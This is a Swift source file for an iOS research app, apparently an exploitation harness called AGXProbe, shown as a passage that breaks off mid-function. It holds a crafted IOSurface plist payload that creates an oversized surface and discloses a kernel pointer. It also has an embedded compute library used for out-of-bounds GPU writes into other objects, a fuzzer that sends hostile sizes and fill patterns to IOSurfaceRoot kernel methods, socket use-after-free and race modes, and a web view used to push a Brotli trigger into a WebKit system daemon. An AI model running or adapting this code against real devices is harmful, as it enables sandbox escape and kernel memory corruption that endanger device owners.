// AGXProbe v123 - Brotli in-daemon oracle (page streams decoded body back)
//
// The IOSurface side is done (see analysis/f1/GEOMETRY-PROBE-RESULTS.md ??11):
// selector 0 with scalarIn[0]=0 and a serialized property list creates a
// surface whose declared per-slice geometry is ~4 GiB against a 64 KiB
// backing store, and discloses the kernel backing pointer at descriptor+0x00.
//
// This file reproduces the F1 transcript's GPU half:
//   * wrap the surface's backing in an MTLBuffer (len = the real alloc size)
//   * run a compute kernel that writes a marker at a GPU-VA offset *past* the
//     buffer's end (the GPU does not bounds-check device buffers)
//   * aim the write at a control buffer we allocated, using
//     delta = control.gpuAddress - f1.gpuAddress
//   * read the control buffer back on the CPU: a marker there == a
//     cross-object GPU write from a plain sandboxed app.
//
// The metallib is embedded as base64 and written to Documents at runtime
// (MTLDevice.newLibraryWithURL: is available on iOS 11+).

import SwiftUI
import Darwin
import Foundation
import CoreFoundation
import UIKit
import WebKit
import Metal
import VideoToolbox
import CoreMedia
import CoreVideo
import IOSurface

// AVE HEVC parameter-set probe results live at file scope: the VideoToolbox
// output callback is a plain C function pointer and cannot capture context.
private var gAveStatus: OSStatus = -9999
private var gAveSample: CMSampleBuffer?
private var gAveSem: DispatchSemaphore? = nil

// Metal allocation churn for --iosurfwatch: the C probe calls this every watch
// iteration. Creating and releasing buffers at the sizes the carveout hands out
// (and touching their contents) exercises the GPU allocator - the one plausible
// non-IOSurface client that could name the same physical range.
private var gMetalChurnDevice: MTLDevice? = nil

private let gMetalChurnCallback: @convention(c) (Int32, Int32) -> Int32 = { (_, _) in
    guard let dev = gMetalChurnDevice else { return 0 }
    var made = 0
    for len in [0x1000, 0x2000, 0x4000, 0x8000, 0x10000] {
        // Private storage is not CPU-mappable: contents() would be NULL and the
        // store below would fault (measured: EXC_BAD_ACCESS at 0x0 inside
        // _platform_memmove from this closure). Allocation alone still exercises
        // the GPU allocator.
        if let b = dev.makeBuffer(length: len, options: .storageModePrivate) {
            if UInt(bitPattern: b.contents()) != 0 {
                b.contents().storeBytes(of: UInt32(len & 0xffff), as: UInt32.self)
            }
            made += 1
        }
        if let b = dev.makeBuffer(length: len, options: .storageModeShared) {
            let p = b.contents()
            if UInt(bitPattern: p) != 0 {
                p.storeBytes(of: UInt32(len & 0xffff), as: UInt32.self)
                made += 1
            }
        }
    }
    return Int32(made)
}

// External-object helpers declared directly: the iOS SDK marks <mach/mach_vm.h>
// unsupported for C clients, but both symbols are exported and were verified
// callable on this device. Declaring them here avoids the header's #error.
@_silgen_name("mach_make_memory_entry_64")
func cv_make_memory_entry_64(_ target: vm_map_t,
                             _ size: UnsafeMutablePointer<mach_vm_size_t>,
                             _ offset: mach_vm_offset_t,
                             _ permission: vm_prot_t,
                             _ object: UnsafeMutablePointer<mach_port_t>,
                             _ parent: mach_port_t) -> kern_return_t

@_silgen_name("mach_vm_map")
func cv_mach_vm_map(_ target: vm_map_t,
                    _ address: UnsafeMutablePointer<mach_vm_address_t>,
                    _ size: mach_vm_size_t,
                    _ mask: mach_vm_offset_t,
                    _ flags: Int32,
                    _ object: mach_port_t,
                    _ offset: memory_object_offset_t,
                    _ copy: boolean_t,
                    _ cur: vm_prot_t,
                    _ max: vm_prot_t,
                    _ inherit: vm_inherit_t) -> kern_return_t

// Not declared in the public header, but exported and callable on iOS 27.0/27.0.1.
@_silgen_name("IOSurfacePrefetchPages")
func cv_IOSurfacePrefetchPages(_ buffer: IOSurfaceRef) -> kern_return_t

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v123 - Brotli in-daemon oracle").font(.headline)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runMetalMode() } }) {
                Text(vm.isRunning ? "Running..." : "Run v123 metal")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.red).cornerRadius(8)
            }.disabled(vm.isRunning)
            if !vm.webProbeURL.isEmpty {
                WebProbe(url: vm.webProbeURL, handler: "scan", onMessage: { vm.handleScan($0) })
                    .frame(height: 2)
            }
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}


@_silgen_name("mach_task_self")
func mach_task_self() -> mach_port_t

// ---- the compiled metallib (arm64-apple-ios), embedded so the app needs no
// ---- extra bundle resource; loaded at runtime via newLibraryWithURL.
let metallibBase64 = "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"


// A WKWebView whose only job is to make the *WebKit networking process*
// (a separate system XPC service) fetch a URL for us.  That service decodes
// Content-Encoding: br, so it is a system daemon we can aim the Brotli trigger
// at.  Whether the request really came from WebKit is visible in the
// User-Agent the server logs.
struct WebProbe: UIViewRepresentable {
    let url: String
    var handler: String? = nil
    var onMessage: ((String) -> Void)? = nil

    final class Coordinator: NSObject, WKScriptMessageHandler {
        var onMessage: ((String) -> Void)?
        func userContentController(_ c: WKUserContentController, didReceive m: WKScriptMessage) {
            guard let s = m.body as? String else { return }
            DispatchQueue.main.async { self.onMessage?(s) }
        }
    }

    func makeCoordinator() -> Coordinator {
        let c = Coordinator(); c.onMessage = onMessage; return c
    }

    func makeUIView(context: Context) -> WKWebView {
        let cfg = WKWebViewConfiguration()
        if let h = handler { cfg.userContentController.add(context.coordinator, name: h) }
        let w = WKWebView(frame: .zero, configuration: cfg)
        w.load(URLRequest(url: URL(string: url) ?? URL(string: "about:blank")!))
        return w
    }
    func updateUIView(_ uiView: WKWebView, context: Context) {}
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false
    @Published var webProbeURL: String = ""
    @Published var webTarget: String = ""
    private var scanDone = false

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    nonisolated private func emitBg(_ m: String) {
        print(m); fflush(stdout)
        Task { @MainActor [weak self] in
            guard let self else { return }
            self.log += m + "\n"
            try? self.log.write(to: self.logFileURL, atomically: true, encoding: .utf8)
        }
    }

    private func emit(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        let args = ProcessInfo.processInfo.arguments
        if args.contains("--metal") { await runMetalMode(); return }
        if args.contains("--fuzz") { await runFuzzMode(); return }
        if args.contains("--probe") { await runProbeMode(); return }
        if args.contains("--web") { await runWebMode(); return }
        if args.contains("--webscan") { await runWebScanMode(); return }
        if args.contains("--decmpfs") { Task.detached { await self.runDecmpfsMode() }; return }
        if args.contains("--ane") { Task.detached { await self.runANEMode() }; return }
        if args.contains("--ave") { Task.detached { await self.runAVEMode() }; return }
        if args.contains("--mementry") { Task.detached { await self.runMemEntryMode() }; return }
        if args.contains("--iosurfphys") { Task.detached { await self.runIOSurfPhysMode() }; return }
        if args.contains("--iosurfrace") { Task.detached { await self.runIOSurfRaceMode() }; return }
        if args.contains("--iosurfreclaim") { Task.detached { await self.runIOSurfReclaimMode() }; return }
        if args.contains("--iosurfwatch") { Task.detached { await self.runIOSurfWatchMode() }; return }
        if args.contains("--sockfield") { Task.detached { await self.runSockFieldMode() }; return }
        // Raw-selector IOSurface notify lifetime probe. `--ionotifyrace` adds the
        // bounded close/register race; run that only on the secondary device.
        if args.contains("--ionotify") { Task.detached { await self.runIONotifyMode() }; return }
        if args.contains("--opencand") { Task.detached { XPCProbe.shared.bench99Bit8Clients() }; return }
        if args.contains("--hidsel") { Task.detached { XPCProbe.shared.bench100HIDSel() }; return }
        if args.contains("--sockuaf") { Task.detached { await self.runSocketUafMode() }; return }
        if args.contains("--sockool") || args.contains("--sockxz") || args.contains("--sockgc")
            || args.contains("--sockudp") || args.contains("--sockprec")
            || args.contains("--sockmix")
            || args.contains("--zoneprobe")
            || args.contains("--cowprobe")
            || args.contains("--cowfile")
            || args.contains("--apfsrace")
            || args.contains("--socklowbuf") || args.contains("--rawsock")
            || args.contains("--routesock") || args.contains("--reclaim")
            { Task.detached { await self.runSocketUafMode() }; return }
        if args.contains("--autorun") { emit("AGXProbe v123 ready (use --webscan)") }
    }

    func krN(_ kr: Int32) -> String {
        switch UInt32(bitPattern: kr) {
        case 0: return "OK"
        case 0xe00002bd: return "NoMemory"
        case 0xe00002c1: return "BadMatching"
        case 0xe00002c2: return "BadArgument"
        case 0xe00002c9: return "Duplicate"
        case 0xe00002d8: return "NotAttached"
        default: return String(format: "0x%08x", UInt32(bitPattern: kr))
        }
    }

    // ---- IOKit call helper --------------------------------------------------
    typealias MethodFn = @convention(c) (UInt32, UInt32, UnsafePointer<UInt64>?, UInt32,
                                         UnsafeRawPointer?, Int,
                                         UnsafeMutablePointer<UInt64>?, UnsafeMutablePointer<UInt32>?,
                                         UnsafeMutableRawPointer?, UnsafeMutablePointer<UInt64>?) -> Int32
    private var _cmFn: MethodFn? = nil
    func callMethod(_ conn: UInt32, _ sel: UInt32,
                    _ scalars: UnsafePointer<UInt64>?, _ scalarCnt: UInt32,
                    _ structIn: UnsafeRawPointer?, _ structInSize: Int,
                    _ out: UnsafeMutableRawPointer?, _ outSize: inout UInt64) -> Int32 {
        if _cmFn == nil {
            guard let h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW),
                  let s = dlsym(h, "IOConnectCallMethod") else { return -1 }
            _cmFn = unsafeBitCast(s, to: MethodFn.self)
        }
        guard let f = _cmFn else { return -1 }
        return f(conn, sel, scalars, scalarCnt, structIn, structInSize,
                 nil, nil, out, &outSize)
    }

    // ---- the F1 payload (see the analysis doc) -----------------------------
    func f1XML(hdr: Int, data: Int, sc: Int, alloc: Int) -> [UInt8] {
        let xml = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0"><dict><key>IOSurfaceWidth</key><integer>64</integer><key>IOSurfaceHeight</key><integer>64</integer><key>IOSurfaceBytesPerElement</key><integer>4</integer><key>IOSurfacePixelFormat</key><integer>1111970369</integer><key>IOSurfaceAllocSize</key><integer>\(alloc)</integer><key>IOSurfaceIsGlobal</key><true/><key>IOSurfacePurgeWhenNotInUse</key><false/><key>IOSurfaceSliceCount</key><integer>\(sc)</integer><key>IOSurfacePlaneInfo</key><array><dict><key>IOSurfacePlaneWidth</key><integer>64</integer><key>IOSurfacePlaneHeight</key><integer>64</integer><key>IOSurfacePlaneBytesPerElement</key><integer>4</integer><key>IOSurfacePlaneBytesPerRow</key><integer>512</integer><key>IOSurfacePlaneSize</key><integer>\(alloc)</integer><key>IOSurfacePlaneCompressionType</key><integer>4</integer><key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>\(data)</integer><key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>\(hdr)</integer><key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer><key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer><key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer><key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer><key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer><key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>\(alloc)</integer><key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer><key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer></dict></array></dict></plist>
        """
        return Array(xml.utf8) + [0]
    }


// ---- fuzz the IOSurfaceRoot methods that take a caller-sized structure ----
// The memory-pool / descriptor family (IOSurfaceDescriptorContext,
// IOSurfaceDescriptorComponent, IOSurfaceMemoryPoolBunch, "client shared")
// is the newest and least audited part of the kext and every one of those
// methods takes a caller-sized structure.  This sweeps them with hostile
// lengths and contents and records every return code, so a length-handling
// bug shows up either as an odd rc or as a kernel fault.
func runFuzzMode() async {
    isRunning = true; status = "Fuzzing..."; log = ""
    try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
    var iter: io_iterator_t = 0
    let kr = xq_IOServiceGetMatchingServices(0, xq_IOServiceMatching("IOSurfaceRoot"), &iter)
    guard kr == 0 else { emit("[-] no IOSurfaceRoot"); status = "Complete"; isRunning = false; return }
    let svc = xq_IOIteratorNext(iter)
    var conn: io_connect_t = 0
    guard xq_IOServiceOpen(svc, mach_task_self(), 0, &conn) == 0, conn != 0 else {
        emit("[-] open failed"); status = "Complete"; isRunning = false; return
    }

    // (selector, scalarInputCount, structureInputSize) straight from the
    // decoded dispatch table: 0xffffffff means "variable"
    let shapes: [(UInt32, Int, Int)] = [
        (0x02, 0, 12), (0x03, 0, 12), (0x04, 1, 0), (0x06, 0, 32), (0x07, 2, 0),
        (0x09, 0, -1), (0x0a, 0, -1), (0x0b, 0, -1), (0x13, 0, -1), (0x18, 0, -1),
        (0x1a, 0, -1), (0x1b, 0, 160), (0x1c, 1, 0), (0x1e, 1, -1), (0x22, 1, 0),
        (0x2e, 0, -1), (0x2f, 1, -1), (0x30, 1, -1), (0x31, 1, -1), (0x32, 2, -1),
        (0x33, 2, -1), (0x36, 0, -1)
    ]
    let sizes: [Int] = [0, 8, 16, 32, 64, 88, 160, 256, 0x1000, 0xc68]
    let pats: [(String, UInt64)] = [("zeros", 0), ("ones", 0xffffffffffffffff),
                                   ("41", 0x4141414141414141),
                                   ("big", 0x7fffffffffffffff),
                                   ("off", 0x0000100000000000)]

    for (sel, nScalars, fixedSize) in shapes {
      for size in sizes {
        if fixedSize >= 0 && size != fixedSize { continue }
        for (pname, fill) in pats {
                var buf = [UInt8](repeating: 0, count: max(size, 8))
                for i in stride(from: 0, to: buf.count, by: 8) {
                    for b in 0..<8 { buf[i + b] = UInt8((fill >> (8 * UInt64(b))) & 0xff) }
                }
                var out = [UInt8](repeating: 0, count: 0xc68)
                var outSize: UInt64 = 0xc68
                var sc: [UInt64] = [UInt64](repeating: 0, count: max(nScalars, 1))
                let r: Int32 = sc.withUnsafeMutableBufferPointer { sb in
                    buf.withUnsafeBufferPointer { pb in
                        out.withUnsafeMutableBytes { ob in
                            callMethod(conn, sel, nScalars > 0 ? UnsafePointer(sb.baseAddress) : nil,
                                       UInt32(nScalars),
                                       pb.baseAddress, size,
                                       ob.baseAddress, &outSize)
                        }
                    }
                }
                let tag = "sel0x\(String(sel, radix: 16)) size=0x\(String(size, radix: 16)) \(pname) -> \(krN(r))"
                emit(tag)
                if r == 0 {
                    emit("   ^^^ OK  outSize=0x\(String(outSize, radix: 16)) desc=\(out.prefix(0x20).map { String(format: "%02x", $0) }.joined())")
                }
            }
        }
      }
    emit("=== fuzz sweep complete ===")
    _ = xq_IOServiceClose(conn)
    status = "Complete"; isRunning = false
}


    // ---- probe the two paths that reach real code -------------------------
    //  sel 0x22: one scalar, 0xc68 out.  It dispatches an IPC and answers
    //            "asked to allocate client shared id %08x not known by
    //            IOSurfaceRoot" -> the scalar is a client-shared id.
    //  sel 0x1e: one scalar + variable struct; it answers BadMatching, i.e.
    //            it looks a service up by a NAME taken from the struct.
    func runProbeMode() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        var iter: io_iterator_t = 0
        let kr = xq_IOServiceGetMatchingServices(0, xq_IOServiceMatching("IOSurfaceRoot"), &iter)
        guard kr == 0 else { emit("[-] no IOSurfaceRoot"); status = "Complete"; isRunning = false; return }
        let svc = xq_IOIteratorNext(iter)
        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self(), 0, &conn) == 0, conn != 0 else {
            emit("[-] open failed"); status = "Complete"; isRunning = false; return
        }

        // ---- 0x22: client shared id sweep ---------------------------------
        var hist: [String: Int] = [:]
        var oks: [String] = []
        for sid in 0...256 {
            var sc: [UInt64] = [UInt64(sid)]
            var out = [UInt8](repeating: 0, count: 0xc68)
            var outSize: UInt64 = 0xc68
            let r: Int32 = sc.withUnsafeMutableBufferPointer { sb in
                out.withUnsafeMutableBytes { ob in
                    callMethod(conn, 0x22, UnsafePointer(sb.baseAddress), 1, nil, 0,
                               ob.baseAddress, &outSize)
                }
            }
            let k = krN(r)
            hist[k, default: 0] += 1
            if r == 0 {
                oks.append("sid=\(sid) outSize=0x\(String(outSize, radix: 16)) head=\(out.prefix(24).map { String(format: "%02x", $0) }.joined())")
            }
        }
        emit("sel0x22 client-shared-id sweep 0...256: " + hist.map { "\($0.key)=\($0.value)" }.joined(separator: " "))
        for o in oks { emit("   0x22 OK " + o) }

        // ---- 0x1e: name lookup -------------------------------------------
        let names = ["IOSurfaceDescriptorContext", "IOSurfaceMemoryPoolBunch",
                     "IOSurfaceDescriptorComponent", "IOSurfaceShared", "IOSurfaceRoot",
                     "IOSurfaceRootUserClient", "IOSurfaceClient"]
        var hist2: [String: Int] = [:]
        for n in names {
            for scalar in [UInt64(0), 1, 2] {
                var sc: [UInt64] = [scalar]
                var buf = Array(n.utf8) + [0]
                var out = [UInt8](repeating: 0, count: 0xc68)
                var outSize: UInt64 = 0xc68
                let r: Int32 = sc.withUnsafeMutableBufferPointer { sb in
                    buf.withUnsafeBufferPointer { pb in
                        out.withUnsafeMutableBytes { ob in
                            callMethod(conn, 0x1e, UnsafePointer(sb.baseAddress), 1,
                                       pb.baseAddress, buf.count,
                                       ob.baseAddress, &outSize)
                        }
                    }
                }
                hist2["\(n) s\(scalar): \(krN(r))"] = 1
                if r == 0 {
                    emit("   0x1e OK name=\(n) scalar=\(scalar) outSize=0x\(String(outSize, radix: 16))")
                }
            }
        }
        for k in hist2.keys.sorted() { emit("   0x1e \(k)") }
        // ---- 0x06: create_surface_fast_path ------------------------------
        // The 32-byte structure is {u32 count, u32 values[6]}; the kernel
        // copies the values onto six fixed keys (BytesPerRow, Width, Height,
        // PixelFormat, AllocSize, Address) and loops `count` times over the
        // array.  If count is not bounded by the array size, the loop reads
        // past the end of the kernel's copy of the structure.
        var hist3: [String: Int] = [:]
        var ok3: [String] = []
        // a real 0x40-byte userspace buffer: the handler loads the first u64
        // of the structure, and if it is non-NULL it allocates 0x40 bytes and
        // calls into the object with the "IOSurfaceAddress" key
        let backingPtr = UnsafeMutableRawPointer.allocate(byteCount: 0x40, alignment: 8)
        backingPtr.initializeMemory(as: UInt8.self, repeating: 0xAB, count: 0x40)
        let backingAddr = UInt64(UInt(bitPattern: backingPtr))
        for count in 0...64 {
            var words: [UInt64] = [backingAddr,
                                   512,          // IOSurfaceBytesPerRow
                                   64,           // IOSurfaceWidth
                                   64,           // IOSurfaceHeight
